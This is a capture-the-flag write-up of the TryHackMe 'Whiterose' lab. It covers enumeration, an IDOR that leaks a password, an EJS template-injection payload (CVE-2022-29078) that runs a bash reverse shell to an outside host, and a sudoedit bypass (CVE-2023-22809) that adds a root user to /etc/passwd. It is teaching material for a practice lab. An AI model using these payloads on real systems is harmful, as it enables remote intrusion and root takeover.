---
title: "TryHackMe - Whiterose"
author: Nasrallah
description: ""
date: 2024-11-29 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, ssti, cve, idor]
img_path: /assets/img/tryhackme/whiterose
image:
    path: whiterose.png
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

[Whiterose](https://tryhackme.com/r/whiterose) from [TryHackMe](https://tryhackme.com/signup?referrer=603949780215185dfb191142) starts with a website vulnerable to IDOR allowing us to read a password and access a privileged account. The new user can update passwords of users but the template is vulnerable to SSTI enabling us to get a shell. Once in we find the version of sudo is vulnerable to a bypass in sudoedit which allows us to edit the passwd file and get root privileges.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.146.13
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found a webserver on port 80 and ssh on port 22.

### Web

Let's check the website:

![wepage](1.png)

We got redirected to the domain `cyprusbank.thm`, we add that to `/etc/hosts` file and reload the page.

Nothing interesting on this page. I ran a directory scan but couldn't find anything.

Let's run a subdomain fuzz.

```terminal
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://cyprusbank.thm -H "Host: FUZZ.cyprusbank.thm" --fs 57

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/                                                        
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                       
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                       
         \ \_\   \ \_\  \ \____/  \ \_\                                                        
          \/_/    \/_/   \/___/    \/_/                                                        
                                                                                               
       v2.1.0-dev                                                                              
________________________________________________                                    
                                                                                               
 :: Method           : GET                                                                     
 :: URL              : http://cyprusbank.thm                                                   
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt         
 :: Header           : Host: FUZZ.cyprusbank.thm                                    
 :: Follow redirects : false                                                                   
 :: Calibration      : false                                                                   
 :: Timeout          : 10                                                                      
 :: Threads          : 40                                                                      
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500         
 :: Filter           : Response size: 57                                                       
________________________________________________                                    
                                                                                               
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 293ms]
www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 122ms]
:: Progress: [151265/151265] :: Job [1/1] :: 315 req/sec :: Duration: [0:08:44] :: Errors: 0 ::
```

We found admin, let's add it to `/etc/hosts` and navigate to it.

![admin](2.png)

We got a login page, using the credentials giving to us in the room we can log in `Olivia Cortez:olivi8`.

![dashboard](3.png)

Going to the messages page we see a conversation between couple people

![messages](4.png)

We notice on the url a `c` parameter with a number. Changing to a higher value results in more messages.

![password](5.png)

We got the password of `Gayle Bev`

After we log in as that user, we get access to the `settings` page.

![setting](6.png)

On this page we can reset the password of users.

![test](7.png)

Tried to do some sql injections to cause an error but it didn't work.

## **Foothold**

Let's launch burp and inspect it.

![burp](8.png)

Sending the `name` parameter without the password cause an error.

The error comes from `.ejs` files.

Searching on google for `ejs injection` we find this [article](https://eslam.io/posts/ejs-server-side-template-injection-rce/) explaining a SSTI vulnerability in `EJS` [CVE-2022-29078](https://nvd.nist.gov/vuln/detail/CVE-2022-29078).

The payload provided is `settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('command');s` which we add as a post parameter.

![ping](9.png)

This injection is blind but I confirmed it by using the ping command and I successfully received icmp packets.

Now let's get a reverse shell. I used a base64 encoded of the following command

```bash
/bin/bash -i >& /dev/tcp/10.8.81.16/9001 0>&1
```

And I execute it with:

```bash
echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguODEuMTY1LzkwMDEgMD4mMQ==|base64 -d|bash
```

The complete payload now is:

```terminal
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguODEuMTY1LzkwMDEgMD4mMQ==|base64 -d|bash');s
```

![revshell](10.png)

## **Privilege Escalation**

Checking our privileges we find that we can run a `sudoedit` as root.

```terminal
web@cyprusbank:~$ sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

After some research we find the vulnerability [CVE-2023-22809](https://nvd.nist.gov/vuln/detail/cve-2023-22809) that affects `sudo` before `1.9.12p2`.

>In Sudo before 1.9.12p2, the sudoedit (aka -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem exists because a user-specified editor may contain a "--" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value.
{: .prompt-info }

Check the this [article](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis) for more information.

With we can edit the `EDITOR` environment variable to edit the `/etc/passwd` file and add a privileged user.

```bash
export EDITOR="vi -- /etc/passwd"
```

We generate a password hash now with the following command:

```terminal
$ openssl passwd hacker
$1$V5geGPyI$SZ9rieQ0FvnwdJdSq7MKV1
```

And the line we are going to add to the `/etc/passwd` file looks like the following:

```terminal
hacker:$1$V5geGPyI$SZ9rieQ0FvnwdJdSq7MKV1:0:0:root:/root:/bin/bash
```

Now we run the sudo command which is going to open /etc/passwd with vim.

```bash
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

We paste our line and save the file. With that we created a user `hacker` with the password `hacker` that has root privileges.

Running `su hacker` gives us a root shell.

```terminal
web@cyprusbank:~$ su hacker
Password: 
root@cyprusbank:id
uid=0(root) gid=0(root) groups=0(root)
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

<https://nvd.nist.gov/vuln/detail/CVE-2022-29078>

<https://eslam.io/posts/ejs-server-side-template-injection-rce/>

<https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis>

<https://nvd.nist.gov/vuln/detail/cve-2023-22809>
